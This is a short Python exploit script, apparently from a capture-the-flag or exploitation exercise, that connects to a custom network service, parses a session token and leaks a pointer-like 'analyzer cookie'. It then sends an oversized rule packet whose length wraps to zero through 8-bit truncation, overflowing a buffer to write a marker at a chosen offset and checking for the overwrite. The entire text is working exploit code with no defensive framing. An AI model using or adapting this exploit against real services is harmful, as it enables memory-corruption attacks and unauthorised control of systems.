import socket, struct, sys, re
sys.path.insert(0, __file__.rsplit("\\",1)[0])
import client

HOST, PORT = sys.argv[1], int(sys.argv[2])
off = int(sys.argv[3], 0)

s = socket.create_connection((HOST, PORT))
banner = client.rd(s, 1.5)
m = re.search(rb"session token: ([0-9a-f]{8})", banner)
client.TOKEN = int(m.group(1), 16)
tok = client.TOKEN
C = 0x5a5a5a5a41414141
tok12 = (tok & 0xffffffff) << 12

def pkt(ptype, payload, t=1.2):
    client.send_packet(s, ptype, payload)
    return client.rd(s, t)

pkt(2, struct.pack("<I", (tok ^ 0xc0ffee00) & 0xffffffff))
pkt(3, struct.pack("<H", 1) + b"A")     # rule slot
pkt(4, b"\x00\x00\x00")                  # report create
r = pkt(4, b"D")
mm = re.search(rb"analyzer cookie: 0x([0-9a-f]+)", r)
fp1 = (int(mm.group(1),16) ^ C ^ tok12) & 0xffffffffffffffff

MARK = 0x1122334455667788
rlen = 0x100   # passes size check via 8-bit truncation (size wraps to 0)
ov = bytearray(rlen)
struct.pack_into("<Q", ov, off, MARK)
pkt(3, struct.pack("<H", rlen) + bytes(ov))   # overflow

r = pkt(4, b"D")
mm = re.search(rb"analyzer cookie: 0x([0-9a-f]+)", r)
fp2 = (int(mm.group(1),16) ^ C ^ tok12) & 0xffffffffffffffff if mm else None
hit = (fp2 == MARK)
print(f"off={hex(off)} fp1={hex(fp1)} fp2={hex(fp2) if fp2 else None} HIT={hit}")
s.close()
